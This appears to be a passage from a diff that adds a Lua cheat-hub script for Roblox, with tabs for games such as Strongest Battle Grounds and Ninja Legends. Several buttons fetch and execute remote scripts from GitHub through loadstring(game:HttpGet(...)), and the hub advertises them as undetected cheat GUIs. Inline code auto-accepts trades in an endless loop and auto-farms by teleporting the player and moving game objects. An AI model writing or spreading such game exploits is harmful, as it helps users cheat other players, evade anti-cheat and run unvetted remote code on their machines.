+            game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
+end)
+end)
+
+local Main = Window:NewTab("Battle Grounds")
+local MainSection = Main:NewSection("Strongest Battle Grounds")
+
+MainSection:NewButton("Free Gui (Has Keys)", "Un Detected Strongest Battle Grounds Script", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/SaitamaBattlegrounds.lua"))()
+end)
+
+local Main = Window:NewTab("Ninja Legends")
+local MainSection = Main:NewSection("Ninja Legends")
+
+MainSection:NewButton("Auto Accept Trades", "REJOIN TO STOP ACCEPTING TRADES!!", function()
+    while wait() do 
+game.ReplicatedStorage.rEvents.tradingEvent:FireServer("acceptTrade")
+end
+end)
+
+MainSection:NewButton("Ninja Legends Gui", "Ninja Legends Gui", function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/XRoLLu/Rolly_Hub/main/open-source-trash-loader.exe.yeah"))()
+end)
+
+local Main = Window:NewTab("Sans Multiversal Battles")
+local MainSection = Main:NewSection("Sans Multiversal Battles")
+
+MainSection:NewButton("Overwrite Gui", "Overwrite Gui", function()
+   loadstring(game:HttpGet('https://raw.githubusercontent.com/GreenySteveyYtt/Overwrite/main/smb1overwrite.lua'))()
+end)
+
+local Main = Window:NewTab("Undertale Crazy Multiverse")
+local MainSection = Main:NewSection("Undertale Crazy Multiverse Timeline")
+
+MainSection:NewButton("Auto Farm (Gui)", "Auto Farm with other Features", function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Hambourga/I-forgor-/main/Loader.lua"))()
+end)
+
+MainSection:NewButton("Auto Farm ", "Only Auto Farm", function()
+_G.farmon = true
+while _G.farmon do
+   game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(821.514709, 388.48056, 4214.9834, -0.0403586291, -7.05200875e-09, 0.999185264, -1.10081348e-08, 1, 6.61312383e-09, -0.999185264, -1.07322702e-08, -0.0403586291)
+   game:GetService("Workspace").Obby.Obby2.Head.CFrame = game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
+   task.wait()
+end
+end)
+
+local Main = Window:NewTab("Faction Defense Tycoon")
+local MainSection = Main:NewSection("Faction Defense Tycoon")
+
+MainSection:NewButton("Faction Defense Tycoon Gui", "Gui", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/itsnoctural/Utilities/main/Closed/Faction%20Defense%20Tycoon.lua"))()
+end)
+
+local Main = Window:NewTab("The Rake REMASTERED")
+local MainSection = Main:NewSection("The Rake REMASTERED")
